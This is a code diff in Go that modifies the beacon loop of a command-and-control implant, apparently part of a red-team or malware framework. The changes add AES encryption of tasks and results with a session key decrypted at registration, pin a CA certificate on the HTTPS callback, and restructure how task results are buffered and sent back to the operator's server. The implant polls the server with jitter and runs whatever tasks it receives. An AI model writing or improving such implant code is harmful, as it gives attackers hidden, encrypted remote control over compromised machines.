@@ -21,6 +21,7 @@ type Beacon struct {
 	transport     transport.Transport
 	executor      *tasks.Executor
 	sessionID     string
+	sessionKey    []byte // AES session key for encrypted comms
 	sleep         time.Duration
 	jitterPct     int
 	pendingResults []*pb.TaskResult // buffered results from failed sends
@@ -29,7 +30,7 @@ type Beacon struct {
 func New(cfg *Config) *Beacon {
 	return &Beacon{
 		config:    cfg,
-		transport: transport.NewHTTPSTransport(cfg.Callback),
+		transport: transport.NewHTTPSTransport(cfg.Callback, cfg.CACertPEM),
 		executor:  tasks.NewExecutor(plugin.Global),
 		sleep:     cfg.Sleep,
 		jitterPct: cfg.JitterPct,
@@ -56,59 +57,67 @@ func (b *Beacon) Run() {
 
 	log.Printf("[implant] registered: session=%s", b.sessionID)
 
-	// Beacon loop
+	// Beacon loop: single send per cycle
 	for {
+		// 1. Sleep with jitter
 		wait := zcrypto.JitterDuration(b.sleep, b.jitterPct)
 		time.Sleep(wait)
 
-		// Send any buffered results from previous failed sends
-		results := b.sendResults(b.pendingResults)
-		if results != nil {
-			b.pendingResults = nil
-		}
-		if results == nil {
+		// 2. Send beacon with any pending results
+		resp := b.sendResults(b.pendingResults)
+
+		// 3. On failure, keep pendingResults for retry
+		if resp == nil {
 			continue
 		}
 
-		if results.Terminate {
+		// 4. On success, clear pendingResults
+		b.pendingResults = nil
+
+		// 5. Check terminate/sleep-update
+		if resp.Terminate {
 			log.Printf("[implant] terminate received, exiting")
 			return
 		}
 
-		// Update sleep if server changed it
-		if results.NextCheckinMs > 0 {
-			b.sleep = time.Duration(results.NextCheckinMs) * time.Millisecond
+		if resp.NextCheckinMs > 0 {
+			b.sleep = time.Duration(resp.NextCheckinMs) * time.Millisecond
 		}
 
-		// Execute tasks and collect results for next beacon
-		var taskResults []*pb.TaskResult
-		for _, task := range results.Tasks {
+		// 6. Execute response tasks, append results to pendingResults
+		// Decrypt tasks if session key is active
+		taskList := resp.Tasks
+		if b.sessionKey != nil && len(resp.EncryptedTasks) > 0 {
+			plaintext, err := zcrypto.AESDecrypt(b.sessionKey, resp.EncryptedTasks)
+			if err != nil {
+				log.Printf("[implant] decrypt tasks error: %v", err)
+			} else {
+				payload := &pb.BeaconTasksPayload{}
+				if err := proto.Unmarshal(plaintext, payload); err != nil {
+					log.Printf("[implant] unmarshal decrypted tasks error: %v", err)
+				} else {
+					taskList = payload.Tasks
+				}
+			}
+		}
+
+		for _, task := range taskList {
 			if task.TaskType == pb.TaskType_TASK_EXIT {
 				log.Printf("[implant] exit task received")
 				return
 			}
 			if task.TaskType == pb.TaskType_TASK_SLEEP {
 				b.handleSleep(task)
-				taskResults = append(taskResults, &pb.TaskResult{
+				b.pendingResults = append(b.pendingResults, &pb.TaskResult{
 					TaskId:  task.TaskId,
 					Success: true,
 				})
 				continue
 			}
 			result := b.executor.Execute(task)
-			taskResults = append(taskResults, result)
+			b.pendingResults = append(b.pendingResults, result)
 		}
-
-		// Buffer results for next send
-		b.pendingResults = append(b.pendingResults, taskResults...)
-
-		// Send all buffered results
-		if len(b.pendingResults) > 0 {
-			if resp := b.sendResults(b.pendingResults); resp != nil {
-				b.pendingResults = nil // clear on success
-			}
-			// On failure, pendingResults are retained for retry
-		}
+		// 7. Results will be sent on NEXT cycle
 	}
 }
 
@@ -147,6 +156,18 @@ func (b *Beacon) register() error {
 	if resp.NextCheckinMs > 0 {
 		b.sleep = time.Duration(resp.NextCheckinMs) * time.Millisecond
 	}
+
+	// Decrypt session key if provided
+	if len(resp.EncryptedSessionKey) > 0 {
+		sessionKey, err := zcrypto.AESDecrypt(b.config.Secret, resp.EncryptedSessionKey)
+		if err != nil {
+			log.Printf("[implant] failed to decrypt session key: %v", err)
+		} else {
+			b.sessionKey = sessionKey
+			log.Printf("[implant] session key established")
+		}
+	}
+
 	return nil
 }
 
@@ -159,7 +180,26 @@ func (b *Beacon) sendResults(results []*pb.TaskResult) *pb.BeaconResponse {
 		SessionId: b.sessionID,
 		Timestamp: now,
 		Hmac:      hmac,
-		Results:   results,
+	}
+
+	// Encrypt results if session key is active
+	if b.sessionKey != nil && len(results) > 0 {
+		payload := &pb.BeaconResultsPayload{Results: results}
+		plaintext, err := proto.Marshal(payload)
+		if err != nil {
+			log.Printf("[implant] marshal results payload error: %v", err)
+			beacon.Results = results // fallback to plaintext
+		} else {
+			encrypted, err := zcrypto.AESEncrypt(b.sessionKey, plaintext)
+			if err != nil {
+				log.Printf("[implant] encrypt results error: %v", err)
+				beacon.Results = results // fallback to plaintext
+			} else {
+				beacon.EncryptedResults = encrypted
+			}
+		}
+	} else {
+		beacon.Results = results
 	}
 
 	resp, err := b.transport.Beacon(beacon)
@@ -189,4 +229,3 @@ func (b *Beacon) handleSleep(task *pb.Task) {
 		b.jitterPct = int(sleepTask.JitterPct)
 	}
 }
-
